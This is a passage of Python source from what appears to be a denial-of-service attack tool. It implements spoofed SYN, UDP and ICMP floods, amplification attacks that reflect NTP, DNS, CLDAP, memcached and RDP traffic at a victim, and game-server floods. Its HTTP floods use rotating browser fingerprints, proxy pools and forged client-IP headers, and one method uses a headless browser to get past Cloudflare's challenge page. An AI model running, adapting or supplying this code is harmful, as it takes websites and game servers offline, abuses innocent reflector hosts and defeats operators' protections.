        self._amp_payload = None
        self._amp_payloads = cycle([])
        self._ref = ref
        self.protocolid = protocolid
        self._method = method
        self._target = target
        self._synevent = synevent
        self._proxy_pool = proxy_pool
        self.methods = {
            "UDP": self.UDP,
            "SYN": self.SYN,
            "VSE": self.VSE,
            "TS3": self.TS3,
            "MCPE": self.MCPE,
            "FIVEM": self.FIVEM,
            "FIVEM-TOKEN": self.FIVEMTOKEN,
            "OVH-UDP": self.OVHUDP,
            "MINECRAFT": self.MINECRAFT,
            "CPS": self.CPS,
            "CONNECTION": self.CONNECTION,
            "MCBOT": self.MCBOT,
        }

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    def open_connection(
        self, conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP
    ):
        proxy = None
        if self._proxy_pool:
            proxy = self._proxy_pool.get_proxy()
            if proxy:
                try:
                    s = proxy.open_socket(conn_type, sock_type, proto_type)
                except Exception:
                    self._proxy_pool.report_failure(proxy)
                    raise
            else:
                s = socket(conn_type, sock_type, proto_type)
        else:
            s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        s.settimeout(0.9)
        try:
            s.connect(self._target)
        except Exception:
            if proxy and self._proxy_pool:
                self._proxy_pool.report_failure(proxy)
            raise
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, randbytes(1024)):
                continue
        Tools.safe_close(s)

    def MINECRAFT(self) -> None:
        handshake = Minecraft.handshake(self._target, self.protocolid, 1)
        ping = Minecraft.data(b"\x00")
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while Tools.send(s, handshake):
                Tools.send(s, ping)
        Tools.safe_close(s)

    def CPS(self) -> None:
        global REQUESTS_SENT
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            REQUESTS_SENT += 1
        Tools.safe_close(s)

    def alive_connection(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while s.recv(1):
                continue
        Tools.safe_close(s)

    def CONNECTION(self) -> None:
        global REQUESTS_SENT
        with suppress(Exception):
            Thread(target=self.alive_connection).start()
            REQUESTS_SENT += 1

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, randbytes(1024), self._target):
                continue
        Tools.safe_close(s)

    def OVHUDP(self) -> None:
        with socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while True:
                for payload in self._generate_ovhudp():
                    Tools.sendto(s, payload, self._target)
        Tools.safe_close(s)

    def ICMP(self) -> None:
        payload = self._genrate_icmp()
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue
        Tools.safe_close(s)

    def AMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_UDP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, *next(self._amp_payloads)):
                continue
        Tools.safe_close(s)

    def MCBOT(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            Tools.send(
                s,
                Minecraft.handshake_forwarded(
                    self._target,
                    self.protocolid,
                    2,
                    ProxyTools.Random.rand_ipv4(),
                    uuid4(),
                ),
            )
            username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
            password = b64encode(username.encode()).decode()[:8].title()
            Tools.send(s, Minecraft.login(self.protocolid, username))
            sleep(1.5)
            Tools.send(
                s,
                Minecraft.chat(
                    self.protocolid, "/register %s %s" % (password, password)
                ),
            )
            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))
            while Tools.send(
                s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))
            ):
                sleep(1.1)
        Tools.safe_close(s)

    def VSE(self) -> None:
        payload = b"\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEMTOKEN(self) -> None:
        token = str(uuid4())
        steamid_min, steamid_max = 76561197960265728, 76561199999999999
        guid = str(randint(steamid_min, steamid_max))
        payload = f"token={token}&guid={guid}".encode("utf-8")
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def FIVEM(self) -> None:
        payload = b"\xff\xff\xff\xffgetinfo xxx\x00\x00\x00"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def TS3(self) -> None:
        payload = b"\x05\xca\x7f\x16\x9c\x11\xf9\x89\x00\x00\x00\x00\x02"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def MCPE(self) -> None:
        payload = b"\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73"
        with socket(AF_INET, SOCK_DGRAM) as s:
            while Tools.sendto(s, payload, self._target):
                continue
        Tools.safe_close(s)

    def _generate_ovhudp(self) -> List[bytes]:
        packets = []
        methods, paths = (
            ["PGET", "POST", "HEAD", "OPTIONS", "PURGE"],
            [
                "/0/0/0/0/0/0",
                "/0/0/0/0/0/0/",
                "\\0\\0\\0\\0\\0\\0",
                "\\0\\0\\0\\0\\0\\0\\",
                "/",
                "/null",
                "/%00%00%00%00",
            ],
        )
        for _ in range(randint(2, 4)):
            ip, udp = IP(), UDP()
            ip.set_ip_src(__ip__)
            ip.set_ip_dst(self._target[0])
            udp.set_uh_sport(randint(1024, 65535))
            udp.set_uh_dport(self._target[1])
            payload = (
                f"{randchoice(methods)} {randchoice(paths)}{randbytes(randint(1024, 2048)).decode('latin1', 'ignore')} HTTP/1.1\nHost: {self._target[0]}:{self._target[1]}\r\n\r\n"
            ).encode("latin1", "ignore")
            udp.contains(Data(payload))
            ip.contains(udp)
            packets.append(ip.get_packet())
        return packets

    def _genrate_syn(self) -> bytes:
        ip, tcp = IP(), TCP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        tcp.set_SYN()
        tcp.set_th_flags(0x02)
        tcp.set_th_dport(self._target[1])
        tcp.set_th_sport(ProxyTools.Random.rand_int(32768, 65535))
        ip.contains(tcp)
        return ip.get_packet()

    def _genrate_icmp(self) -> bytes:
        ip, icmp = IP(), ICMP()
        ip.set_ip_src(__ip__)
        ip.set_ip_dst(self._target[0])
        icmp.set_icmp_type(icmp.ICMP_ECHO)
        icmp.contains(Data(b"A" * ProxyTools.Random.rand_int(16, 1024)))
        ip.contains(icmp)
        return ip.get_packet()

    def _generate_amp(self):
        payloads = []
        for ref in self._ref:
            ip, ud = IP(), UDP()
            ip.set_ip_src(self._target[0])
            ip.set_ip_dst(ref)
            ud.set_uh_dport(self._amp_payload[1])
            ud.set_uh_sport(self._target[1])
            ud.contains(Data(self._amp_payload[0]))
            ip.contains(ud)
            payloads.append((ip.get_packet(), (ref, self._amp_payload[1])))
        return payloads

    def select(self, name):
        self.SENT_FLOOD = self.TCP
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value
            elif name == "ICMP":
                self.SENT_FLOOD, self._target = self.ICMP, (self._target[0], 0)
            elif name == "RDP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x00\x00\x00\x00\x00\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00",
                        3389,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "CLDAP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00",
                        389,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "MEM":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x00\x01\x00\x00\x00\x01\x00\x00gets p h e\n", 11211),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "CHAR":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x01", 19),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "ARD":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x00\x14\x00\x00", 3283),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "NTP":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (b"\x17\x00\x03\x2a\x00\x00\x00\x00", 123),
                    self.AMP,
                    cycle(self._generate_amp()),
                )
            elif name == "DNS":
                self._amp_payload, self.SENT_FLOOD, self._amp_payloads = (
                    (
                        b"\x45\x67\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c\x00\x00\xff\x00\x01\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00",
                        53,
                    ),
                    self.AMP,
                    cycle(self._generate_amp()),
                )


class HttpFlood(Thread):
    _proxy_pool: TacticalProxyPool = None
    _cfbuam_cookie: str = None
    _cfbuam_ua: str = None
    _cfbuam_lock = Lock()
    
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(
        self,
        thread_id: int,
        target: URL,
        host: str,
        method: str = "GET",
        rpc: int = 1,
        synevent: Event = None,
        useragents: Set[str] = None,
        referers: Set[str] = None,
        proxy_pool: TacticalProxyPool = None,
    ) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        (
            self._thread_id,
            self._synevent,
            self._rpc,
            self._method,
            self._target,
            self._host,
            self._proxy_pool,
        ) = (
            thread_id,
            synevent,
            rpc,
            method,
            target,
            host,
            proxy_pool,
        )
        self._raw_target = (self._host, (self._target.port or 80))
        if not self._target.host[len(self._target.host) - 1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))
        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "BOMB": self.BOMB,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
        }
        if not referers:
            referers = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u=",
            ]
        self._referers = list(referers)
        if not useragents:
            useragents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 ",
                "Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19582",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.19577",
                "Mozilla/5.0 (X11) AppleWebKit/62.41 (KHTML, like Gecko) Edge/17.10859 Safari/452.6",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14931",
                "Chrome (AppleWebKit/537.1; Chrome50.0; Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
                "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.9200",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
                "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
                "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
                "Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_IncredibleS_S710e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
                "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
            ]
        self._useragents, self._req_type = list(useragents), self.getMethodType(method)
        self._rebuild_payload()

    def _rebuild_payload(self):
        """Advanced Fingerprinting: Rebuilds payload with dynamic, realistic browser headers."""
        self._defaultpayload = "%s %s HTTP/%s\r\n" % (
            self._req_type,
            self._target.raw_path_qs,
            randchoice(["1.0", "1.1", "1.2"]),
        )
        
        # Advanced Evasion Fingerprints
        fingerprints = [
            # Chrome Windows
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Sec-Ch-Ua: \"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"114\", \"Google Chrome\";v=\"114\"\r\n"
            "Sec-Ch-Ua-Mobile: ?0\r\n"
            "Sec-Ch-Ua-Platform: \"Windows\"\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Upgrade-Insecure-Requests: 1\r\n",
            
            # Firefox Mac
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
            "Accept-Encoding: gzip, deflate, br\r\n"
            "Accept-Language: en-US,en;q=0.5\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
            "Sec-Fetch-User: ?1\r\n"
            "Upgrade-Insecure-Requests: 1\r\n",
            
            # Safari iOS
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            "Accept-Encoding: gzip, deflate\r\n"
            "Accept-Language: en-US,en;q=0.9\r\n"
            "Sec-Fetch-Dest: document\r\n"
            "Sec-Fetch-Mode: navigate\r\n"
            "Sec-Fetch-Site: none\r\n"
        ]

        # Use basic static headers if not explicitly in evasion mode to save CPU
        if "--evasion" in argv:
            selected_fp = randchoice(fingerprints)
            conn_type = randchoice(["keep-alive", "Upgrade"])
        else:
            selected_fp = (
                "Accept-Encoding: gzip, deflate, br\r\n"
                "Accept-Language: en-US,en;q=0.9\r\n"
                "Cache-Control: max-age=0\r\n"
                "Sec-Fetch-Dest: document\r\n"
                "Sec-Fetch-Mode: navigate\r\n"
                "Sec-Fetch-Site: none\r\n"
                "Sec-Fetch-User: ?1\r\n"
                "Sec-Gpc: 1\r\n"
                "Pragma: no-cache\r\n"
                "Upgrade-Insecure-Requests: 1\r\n"
            )
            conn_type = "keep-alive"

        self._payload = self._defaultpayload + selected_fp + f"Connection: {conn_type}\r\n"

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        original_rpc = self._rpc
        smart_rpc_enabled = "--smart" in argv
        while self._synevent.is_set():
            if smart_rpc_enabled:
                # Smart RPC Adjustment
                if CURRENT_LATENCY.value > 2000 or CURRENT_LATENCY.value == -1.0:
                    self._rpc = max(1, original_rpc // 2)
                elif CURRENT_LATENCY.value > 0 and CURRENT_LATENCY.value < 500:
                    self._rpc = original_rpc

            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return (
            "X-Forwarded-Proto: Http\r\n"
            f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
            f"Via: {spoof}\r\n"
            f"Client-IP: {spoof}\r\n"
            f"X-Forwarded-For: {spoof}\r\n"
            f"Real-IP: {spoof}\r\n"
        )

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode(
            (
                self._payload
                + f"Host: {self._target.authority}\r\n"
                + self.randHeadercontent
                + (other if other else "")
                + "\r\n"
            )
        )

    def open_connection(self, host=None) -> socket:
        if self._proxy_pool:
            proxy = self._proxy_pool.get_proxy()
            if proxy:
                sock = proxy.open_socket(AF_INET, SOCK_STREAM)
            else:
                sock = socket(AF_INET, SOCK_STREAM)
        else:
            sock = socket(AF_INET, SOCK_STREAM)
        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
        sock.settimeout(0.9)
        sock.connect(host or self._raw_target)
        if self._target.scheme.lower() == "https":
            sock = ctx.wrap_socket(
                sock,
                server_hostname=host[0] if host else self._target.host,
                server_side=False,
                do_handshake_on_connect=True,
                suppress_ragged_eofs=True,
            )
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
            + self.SpoofIP
        )

    @staticmethod
    def getMethodType(method: str) -> str:
        return (
            "GET"
            if {method.upper()}
            & {
                "CFB",
                "CFBUAM",
                "GET",
                "TOR",
                "COOKIE",
                "OVH",
                "EVEN",
                "DYN",
                "SLOW",
                "PPS",
                "APACHE",
                "BOT",
                "RHEX",
                "STOMP",
            }
            else (
                "POST"
                if {method.upper()} & {"POST", "XMLRPC", "STRESS"}
                else "HEAD" if {method.upper()} & {"GSB", "HEAD"} else "REQUESTS"
            )
        )

    def POST(self) -> None:
        payload = self.generate_payload(
            (
                "Content-Length: 44\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n\r\n"
                '{"data": %s}'
            )
            % ProxyTools.Random.rand_str(32)
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def TOR(self) -> None:
        provider = "." + randchoice(tor2webs)
        target = self._target.authority.replace(".onion", provider)
        payload = str.encode(
            self._payload + f"Host: {target}\r\n" + self.randHeadercontent + "\r\n"
        )
        s = None
        target = self._target.host.replace(".onion", provider), self._raw_target[1]
        with suppress(Exception), self.open_connection(target) as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def STRESS(self) -> None:
        payload = self.generate_payload(
            (
                "Content-Length: 524\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/json\r\n\r\n"
                '{"data": %s}'
            )
            % ProxyTools.Random.rand_str(512)
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def COOKIES(self) -> None:
        payload = self.generate_payload(
            "Cookie: _ga=GA%s; _gat=1; __cfduid=dc232334gwdsd23434542342342342475611928; %s=%s\r\n"
            % (
                ProxyTools.Random.rand_int(1000, 99999),
                ProxyTools.Random.rand_str(6),
                ProxyTools.Random.rand_str(32),
            )
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def APACHE(self) -> None:
        payload = self.generate_payload(
            "Range: bytes=0-,%s" % ",".join("5-%d" % i for i in range(1, 1024))
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def XMLRPC(self) -> None:
        payload = self.generate_payload(
            (
                "Content-Length: 345\r\n"
                "X-Requested-With: XMLHttpRequest\r\n"
                "Content-Type: application/xml\r\n\r\n"
                "<?xml version='1.0' encoding='iso-8859-1'?>"
                "<methodCall><methodName>pingback.ping</methodName>"
                "<params><param><value><string>%s</string></value>"
                "</param><param><value><string>%s</string>"
                "</value></param></params></methodCall>"
            )
            % (ProxyTools.Random.rand_str(64), ProxyTools.Random.rand_str(64))
        )[:-2]
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def PPS(self) -> None:
        payload = str.encode(
            self._defaultpayload + f"Host: {self._target.authority}\r\n\r\n"
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def KILLER(self) -> None:
        while True:
            Thread(target=self.GET, daemon=True).start()

    def GET(self) -> None:
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def BOT(self) -> None:
        payload = self.generate_payload()
        p1 = str.encode(
            "GET /robots.txt HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\nAccept: text/plain,text/html,*/*\r\nUser-Agent: %s\r\nAccept-Encoding: gzip,deflate,br\r\n\r\n"
            % (self._target.raw_authority, randchoice(search_engine_agents))
        )
        p2 = str.encode(
            "GET /sitemap.xml HTTP/1.1\r\nHost: %s\r\nConnection: Keep-Alive\r\nAccept: */*\r\nFrom: googlebot(at)googlebot.com\r\nUser-Agent: %s\r\nAccept-Encoding: gzip,deflate,br\r\nIf-None-Match: %s-%s\r\nIf-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n"
            % (
                self._target.raw_authority,
                randchoice(search_engine_agents),
                ProxyTools.Random.rand_str(9),
                ProxyTools.Random.rand_str(4),
            )
        )
        s = None
        with suppress(Exception), self.open_connection() as s:
            Tools.send(s, p1)
            Tools.send(s, p2)
            for _ in range(self._rpc):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def EVEN(self) -> None:
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            while Tools.send(s, payload) and s.recv(1):
                continue
        Tools.safe_close(s)

    def OVH(self) -> None:
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(min(self._rpc, 5)):
                Tools.send(s, payload)
        Tools.safe_close(s)

    def CFB(self) -> None:
        global REQUESTS_SENT, BYTES_SEND
        pro = self._proxy_pool.get_proxy() if self._proxy_pool else None
        s = None
        with suppress(Exception), create_scraper() as s:
            for _ in range(self._rpc):
                if pro:
                    with s.get(
                        self._target.human_repr(), proxies=pro.asRequest(), timeout=5
                    ) as res:
                        REQUESTS_SENT += 1
                        BYTES_SEND += Tools.sizeOfRequest(res)
                        continue
                with s.get(self._target.human_repr(), timeout=5) as res:
                    REQUESTS_SENT += 1
                    BYTES_SEND += Tools.sizeOfRequest(res)
        Tools.safe_close(s)

    def CFBUAM(self) -> None:
        """
        Cloudflare UAM Bypass using Headless Browser.
        Solves the JS challenge once globally, then all threads use the synced cookies.
        """
        if not HttpFlood._cfbuam_cookie:
            with HttpFlood._cfbuam_lock:
                if not HttpFlood._cfbuam_cookie: # Double-checked locking
                    proxy_str = str(self._proxy_pool.get_proxy()) if self._proxy_pool else None
                    cookie, ua = BrowserEngine.solve_cf(str(self._target), proxy=proxy_str)
                    if cookie:
                        HttpFlood._cfbuam_cookie = cookie
                        if ua: HttpFlood._cfbuam_ua = ua
                    else:
                        HttpFlood._cfbuam_cookie = "_yummy=choco" # Fallback

        req = (
            self._payload
            + f"Host: {self._target.authority}\r\n"
            + f"Cookie: {HttpFlood._cfbuam_cookie}\r\n"
        )
        
        # Override UA if we got one from browser, else use the evasion/randomized one
        if HttpFlood._cfbuam_ua:
            req += f"User-Agent: {HttpFlood._cfbuam_ua}\r\n"
            req += f"Referer: {self._target.human_repr()}\r\n"
            req += self.SpoofIP
        else:
            req += self.randHeadercontent

        req += "\r\n"

        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
                Tools.send(s, str.encode(req))
        Tools.safe_close(s)

    def AVB(self) -> None:
        payload = self.generate_payload()
        s = None
        with suppress(Exception), self.open_connection() as s:
            for _ in range(self._rpc):
